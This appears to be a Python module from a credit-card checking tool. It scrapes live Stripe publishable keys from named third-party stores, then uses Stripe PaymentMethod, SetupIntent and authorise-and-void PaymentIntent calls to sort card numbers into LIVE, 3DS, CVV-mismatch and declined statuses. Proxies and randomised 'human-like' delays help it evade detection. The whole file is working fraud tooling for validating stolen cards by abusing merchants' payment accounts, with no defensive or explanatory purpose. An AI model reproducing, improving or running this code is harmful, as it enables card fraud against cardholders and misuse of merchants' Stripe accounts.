"""
Enhanced Stripe Gateway with SetupIntent and PaymentMethod support
Integrates stealth, circuit breaker, and response parsing
"""

import os
import re
import json
import time
import random
from typing import Tuple, Optional, Dict
from faker import Faker
import requests

from gates.gateway_utils import (
    GatewaySession,
    enhanced_gateway,
    cache_token,
    get_cached_token,
    get_stripe_headers,
    random_delay,
    ParsedResponse,
    CardStatus,
    parse_stripe_response,
    format_result,
    CircuitOpenError,
    NetworkError,
)
from tools.bin_lookup import get_card_info

fake = Faker()

# Default Stripe keys from environment
STRIPE_PK = os.environ.get("STRIPE_PK", "")
STRIPE_SK = os.environ.get("STRIPE_SK", "")

# Known working stores for key extraction
FALLBACK_STORES = [
    "https://shopzone.nz",
    "https://pariyatti.org",
]


def _extract_stripe_key(url: str, session: GatewaySession) -> Optional[str]:
    """Extract Stripe publishable key from a website"""
    cache_key = f"stripe_pk_{url}"
    cached = get_cached_token(cache_key)
    if cached:
        return cached
    
    try:
        resp = session.get(url, timeout=15)
        if resp.status_code != 200:
            return None
        
        # Search for pk_live patterns
        patterns = [
            r'pk_live_[a-zA-Z0-9]{20,}',
            r'"publishableKey"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"',
            r'data-stripe-key="(pk_live_[a-zA-Z0-9]+)"',
            r'Stripe\(["\']?(pk_live_[a-zA-Z0-9]+)["\']?\)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, resp.text)
            if matches:
                key = matches[0] if isinstance(matches[0], str) else matches[0]
                if key.startswith("pk_live_"):
                    cache_token(cache_key, key, ttl=3600)  # Cache for 1 hour
                    return key
        
        return None
    except Exception:
        return None


class PaymentMethodResult:
    """Result of creating a payment method - distinguishes network errors from card errors"""
    def __init__(self, pm_id: Optional[str] = None, error_code: Optional[str] = None, 
                 error_msg: Optional[str] = None, is_network_error: bool = False):
        self.pm_id = pm_id
        self.error_code = error_code
        self.error_msg = error_msg
        self.is_network_error = is_network_error
    
    @property
    def success(self) -> bool:
        return self.pm_id is not None
    
    @property
    def error(self) -> Optional[str]:
        if self.error_code and self.error_msg:
            return f"{self.error_code}: {self.error_msg}"
        return self.error_msg


def _create_payment_method(
    session: GatewaySession,
    stripe_pk: str,
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
) -> PaymentMethodResult:
    """
    Create a Stripe PaymentMethod using the API.
    
    Returns:
        PaymentMethodResult with pm_id or error details
    """
    url = "https://api.stripe.com/v1/payment_methods"
    
    # Normalize year
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    data = {
        "type": "card",
        "card[number]": card_num,
        "card[exp_month]": card_mon,
        "card[exp_year]": card_yer,
        "card[cvc]": card_cvc,
        "billing_details[address][postal_code]": fake.zipcode(),
        "key": stripe_pk,
    }
    
    headers = get_stripe_headers(stripe_pk, "https://js.stripe.com")
    
    try:
        resp = session.post(url, data=data, headers=headers, timeout=20)
        resp_json = resp.json()
        
        if resp.status_code == 200 and "id" in resp_json:
            return PaymentMethodResult(pm_id=resp_json["id"])
        
        # Extract error - this is a card error, not network error
        error = resp_json.get("error", {})
        error_code = error.get("code", "unknown")
        error_msg = error.get("message", "Unknown error")
        
        return PaymentMethodResult(error_code=error_code, error_msg=error_msg, is_network_error=False)
        
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
        # Network/infrastructure error
        return PaymentMethodResult(error_msg=str(e), is_network_error=True)
    except CircuitOpenError as e:
        # Circuit breaker tripped
        return PaymentMethodResult(error_msg=str(e), is_network_error=True)
    except Exception as e:
        # Other errors - treat as network error to be safe
        return PaymentMethodResult(error_msg=str(e), is_network_error=True)


class SetupIntentResult:
    """Result of confirming a SetupIntent - distinguishes network errors from card errors"""
    def __init__(self, status: Optional[str] = None, intent_id: Optional[str] = None,
                 error_code: Optional[str] = None, error_msg: Optional[str] = None, 
                 is_network_error: bool = False, raw_response: Optional[Dict] = None):
        self.status = status
        self.intent_id = intent_id
        self.error_code = error_code
        self.error_msg = error_msg
        self.is_network_error = is_network_error
        self.raw_response = raw_response or {}
    
    @property
    def succeeded(self) -> bool:
        return self.status == "succeeded"
    
    @property
    def requires_action(self) -> bool:
        return self.status == "requires_action"
    
    @property
    def error(self) -> Optional[str]:
        if self.error_code and self.error_msg:
            return f"{self.error_code}: {self.error_msg}"
        return self.error_msg


def _confirm_setup_intent(
    session: GatewaySession,
    stripe_pk: str,
    client_secret: str,
    payment_method_id: str,
) -> SetupIntentResult:
    """Confirm a SetupIntent with a PaymentMethod"""
    intent_id = client_secret.split("_secret_")[0]
    url = f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm"
    
    data = {
        "payment_method": payment_method_id,
        "key": stripe_pk,
        "client_secret": client_secret,
    }
    
    headers = get_stripe_headers(stripe_pk, "https://js.stripe.com")
    
    try:
        resp = session.post(url, data=data, headers=headers, timeout=20)
        resp_json = resp.json()
        
        if "error" in resp_json:
            error = resp_json["error"]
            return SetupIntentResult(
                error_code=error.get("code", "unknown"),
                error_msg=error.get("message", "Unknown error"),
                is_network_error=False,
                raw_response=resp_json
            )
        
        return SetupIntentResult(
            status=resp_json.get("status"),
            intent_id=resp_json.get("id"),
            raw_response=resp_json
        )
        
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
        return SetupIntentResult(error_msg=str(e), is_network_error=True)
    except CircuitOpenError as e:
        return SetupIntentResult(error_msg=str(e), is_network_error=True)
    except Exception as e:
        return SetupIntentResult(error_msg=str(e), is_network_error=True)


def _create_setup_intent(
    session: GatewaySession,
    stripe_pk: str,
) -> SetupIntentResult:
    """Create a new SetupIntent to test card validation"""
    url = "https://api.stripe.com/v1/setup_intents"
    
    data = {
        "key": stripe_pk,
        "usage": "off_session",
    }
    
    headers = get_stripe_headers(stripe_pk, "https://js.stripe.com")
    
    try:
        resp = session.post(url, data=data, headers=headers, timeout=20)
        resp_json = resp.json()
        
        if "error" in resp_json:
            error = resp_json["error"]
            return SetupIntentResult(
                error_code=error.get("code", "unknown"),
                error_msg=error.get("message", "Unknown error"),
                is_network_error=False,
                raw_response=resp_json
            )
        
        return SetupIntentResult(
            status=resp_json.get("status"),
            intent_id=resp_json.get("id"),
            raw_response=resp_json
        )
        
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
        return SetupIntentResult(error_msg=str(e), is_network_error=True)
    except CircuitOpenError as e:
        return SetupIntentResult(error_msg=str(e), is_network_error=True)
    except Exception as e:
        return SetupIntentResult(error_msg=str(e), is_network_error=True)


def _map_stripe_error_to_status(error_code: str, error_msg: str) -> CardStatus:
    """Map Stripe error codes to CardStatus"""
    error_lower = (error_code + " " + error_msg).lower()
    
    # CVV issues
    if "incorrect_cvc" in error_lower or "invalid_cvc" in error_lower:
        return CardStatus.CVV_MISMATCH
    
    # Expiration issues
    if "expired" in error_lower or "invalid_expiry" in error_lower:
        return CardStatus.EXPIRED
    
    # Invalid card number
    if "invalid" in error_lower or "incorrect_number" in error_lower:
        return CardStatus.INVALID
    
    # Insufficient funds
    if "insufficient" in error_lower:
        return CardStatus.INSUFFICIENT
    
    # 3DS required
    if "authentication_required" in error_lower or "requires_action" in error_lower:
        return CardStatus.THREE_DS
    
    # Risk/fraud
    if any(kw in error_lower for kw in ["fraudulent", "lost_card", "stolen_card", "pickup_card"]):
        return CardStatus.RISK
    
    # Rate limiting
    if "rate" in error_lower and "limit" in error_lower:
        return CardStatus.RATE_LIMITED
    
    # Processing error (retryable)
    if "processing_error" in error_lower or "try_again" in error_lower:
        return CardStatus.ERROR
    
    # Generic decline
    return CardStatus.DECLINED


@enhanced_gateway("stripe_enhanced")
def stripe_enhanced_check(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[str] = None,
    stripe_pk: Optional[str] = None,
    client_secret: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Enhanced Stripe card check using PaymentMethod + SetupIntent flow.
    
    This function performs a complete validation by:
    1. Creating a PaymentMethod with the card details
    2. Creating a SetupIntent (if no client_secret provided)
    3. Confirming the SetupIntent with the PaymentMethod
    4. Mapping the result to proper CardStatus (LIVE/3DS/decline)
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV/CVC
        proxy: Optional proxy string
        stripe_pk: Optional Stripe publishable key
        client_secret: Optional SetupIntent client secret (if pre-created)
    
    Returns:
        (status_message, proxy_alive) - proxy_alive is False only for network errors
    """
    session = GatewaySession("stripe_enhanced", proxy=proxy)
    
    # Get Stripe key
    pk = stripe_pk or STRIPE_PK
    if not pk:
        # Try to extract from fallback stores
        for store in FALLBACK_STORES:
            try:
                pk = _extract_stripe_key(store, session)
                if pk:
                    break
            except CircuitOpenError:
                return ("[CIRCUIT OPEN] stripe_enhanced temporarily disabled", False)
            except Exception:
                continue
    
    if not pk:
        return ("Error: No Stripe key available", False)
    
    # Get BIN info
    bin_info = get_card_info(card_num)
    
    # Add human-like delay
    random_delay(0.3, 0.8)
    
    # Step 1: Create PaymentMethod
    pm_result = _create_payment_method(
        session, pk, card_num, card_mon, card_yer, card_cvc
    )
    
    # Handle network errors from PaymentMethod creation
    if pm_result.is_network_error:
        return (f"⚠️ Network Error - {pm_result.error_msg[:40] if pm_result.error_msg else 'Connection failed'}", False)
    
    # Handle card errors from PaymentMethod creation
    if not pm_result.success:
        status = _map_stripe_error_to_status(pm_result.error_code or "", pm_result.error_msg or "")
        return (format_result(status, card_num, bin_info), True)
    
    pm_id = pm_result.pm_id
    
    # Step 2: Create or use existing SetupIntent
    random_delay(0.2, 0.5)
    
    if client_secret:
        # Use provided client_secret
        si_client_secret = client_secret
    else:
        # Create a new SetupIntent
        si_result = _create_setup_intent(session, pk)
        
        if si_result.is_network_error:
            # Network error creating SetupIntent - card might still be valid (CCN)
            return (format_result(CardStatus.CCN, card_num, bin_info, f"PM: {pm_id[:15]}..."), False)
        
        if si_result.error:
            # API error creating SetupIntent - might need secret key
            # Fall back to CCN since PaymentMethod was created successfully
            return (format_result(CardStatus.CCN, card_num, bin_info, f"PM: {pm_id[:15]}..."), True)
        
        si_client_secret = si_result.raw_response.get("client_secret")
        if not si_client_secret:
            # Couldn't get client_secret, fall back to CCN
            return (format_result(CardStatus.CCN, card_num, bin_info, f"PM: {pm_id[:15]}..."), True)
    
    # Step 3: Confirm SetupIntent with PaymentMethod
    random_delay(0.2, 0.5)
    
    confirm_result = _confirm_setup_intent(session, pk, si_client_secret, pm_id)
    
    # Handle network errors from confirmation
    if confirm_result.is_network_error:
        # Network error during confirm - card is at least CCN valid
        return (format_result(CardStatus.CCN, card_num, bin_info, f"PM: {pm_id[:15]}..."), False)
    
    # Step 4: Map the result to CardStatus
    
    # Success - card is LIVE
    if confirm_result.succeeded:
        return (format_result(CardStatus.LIVE, card_num, bin_info, "SetupIntent confirmed"), True)
    
    # 3DS required
    if confirm_result.requires_action:
        next_action = confirm_result.raw_response.get("next_action", {})
        action_type = next_action.get("type", "")
        if action_type == "use_stripe_sdk" or "redirect" in action_type:
            return (format_result(CardStatus.THREE_DS, card_num, bin_info, "Verification required"), True)
        return (format_result(CardStatus.THREE_DS, card_num, bin_info), True)
    
    # Handle error from confirmation
    if confirm_result.error:
        status = _map_stripe_error_to_status(confirm_result.error_code or "", confirm_result.error_msg or "")
        return (format_result(status, card_num, bin_info), True)
    
    # Unknown status - treat as CCN since PM was created
    return (format_result(CardStatus.CCN, card_num, bin_info, f"PM: {pm_id[:15]}..."), True)


def stripe_auth_enhanced(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Auth-only Stripe check (no charge).
    Wrapper for stripe_enhanced_check.
    """
    return stripe_enhanced_check(card_num, card_mon, card_yer, card_cvc, proxy=proxy)


@enhanced_gateway("stripe_charge")
def stripe_charge_enhanced(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    amount: int = 100,  # Amount in cents
    currency: str = "usd",
    proxy: Optional[str] = None,
    stripe_sk: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Stripe charge check using PaymentIntent (requires secret key).
    
    Performs a complete charge flow:
    1. Creates PaymentMethod with card details
    2. Creates and confirms PaymentIntent
    3. Cancels the PaymentIntent if successful (auth-only)
    4. Maps result to proper CardStatus (LIVE/3DS/decline)
    
    Args:
        card_num: Card number
        card_mon: Expiry month
        card_yer: Expiry year
        card_cvc: CVV
        amount: Amount in cents (default 100 = $1.00)
        currency: Currency code (default USD)
        proxy: Optional proxy
        stripe_sk: Stripe secret key (required)
    
    Returns:
        (status_message, proxy_alive) - proxy_alive is False only for network errors
    """
    sk = stripe_sk or STRIPE_SK
    if not sk:
        return ("Error: Stripe secret key required for charges", False)
    
    session = GatewaySession("stripe_charge", proxy=proxy)
    bin_info = get_card_info(card_num)
    
    # Normalize year
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    try:
        # Step 1: Create PaymentMethod
        pm_url = "https://api.stripe.com/v1/payment_methods"
        pm_data = {
            "type": "card",
            "card[number]": card_num,
            "card[exp_month]": card_mon,
            "card[exp_year]": card_yer,
            "card[cvc]": card_cvc,
        }
        
        pm_resp = requests.post(
            pm_url,
            data=pm_data,
            auth=(sk, ""),
            timeout=20,
        )
        
        if pm_resp.status_code != 200:
            error_json = pm_resp.json().get("error", {})
            error_code = error_json.get("code", "")
            error_msg = error_json.get("message", "Unknown")
            status = _map_stripe_error_to_status(error_code, error_msg)
            return (format_result(status, card_num, bin_info), True)
        
        pm_id = pm_resp.json()["id"]
        
        random_delay(0.3, 0.6)
        
        # Step 2: Create PaymentIntent and confirm
        pi_url = "https://api.stripe.com/v1/payment_intents"
        pi_data = {
            "amount": amount,
            "currency": currency,
            "payment_method": pm_id,
            "confirm": "true",
            "capture_method": "manual",  # Auth only, don't capture
        }
        
        pi_resp = requests.post(
            pi_url,
            data=pi_data,
            auth=(sk, ""),
            timeout=20,
        )
        
        pi_json = pi_resp.json()
        
        # Success - requires_capture means auth succeeded
        if pi_json.get("status") == "requires_capture":
            # Void/cancel the payment intent
            try:
                cancel_url = f"https://api.stripe.com/v1/payment_intents/{pi_json['id']}/cancel"
                requests.post(cancel_url, auth=(sk, ""), timeout=10)
            except Exception:
                pass  # Best effort cancel
            
            return (format_result(CardStatus.LIVE, card_num, bin_info, "Charged & Voided"), True)
        
        # 3DS required
        if pi_json.get("status") == "requires_action":
            next_action = pi_json.get("next_action", {})
            action_type = next_action.get("type", "")
            extra = "Verification required" if action_type else None
            return (format_result(CardStatus.THREE_DS, card_num, bin_info, extra), True)
        
        # Check for errors in PaymentIntent
        if "error" in pi_json:
            error = pi_json["error"]
            error_code = error.get("code", "")
            error_msg = error.get("message", "")
            status = _map_stripe_error_to_status(error_code, error_msg)
            return (format_result(status, card_num, bin_info), True)
        
        # Check last_payment_error for declined payments
        if pi_json.get("last_payment_error"):
            error = pi_json["last_payment_error"]
            error_code = error.get("code", "")
            error_msg = error.get("message", "")
            status = _map_stripe_error_to_status(error_code, error_msg)
            return (format_result(status, card_num, bin_info), True)
        
        # Unknown status
        return (format_result(CardStatus.DECLINED, card_num, bin_info), True)
        
    except requests.exceptions.Timeout as e:
        # Network timeout - triggers circuit breaker
        return (f"⏱️ TIMEOUT - {str(e)[:30]}", False)
    except requests.exceptions.ConnectionError as e:
        # Connection error - triggers circuit breaker  
        return (f"⚠️ Connection Error - {str(e)[:30]}", False)
    except CircuitOpenError:
        # Circuit breaker is open
        return ("[CIRCUIT OPEN] stripe_charge temporarily disabled", False)
    except NetworkError as e:
        # Network error from GatewaySession
        return (f"⚠️ Network Error - {str(e)[:30]}", False)
    except Exception as e:
        # Other exceptions - likely card-related, don't trigger circuit breaker
        error_str = str(e).lower()
        if any(kw in error_str for kw in ["timeout", "connection", "socket", "ssl", "proxy"]):
            return (f"⚠️ Network Error - {str(e)[:30]}", False)
        return (f"Error: {str(e)[:40]}", True)
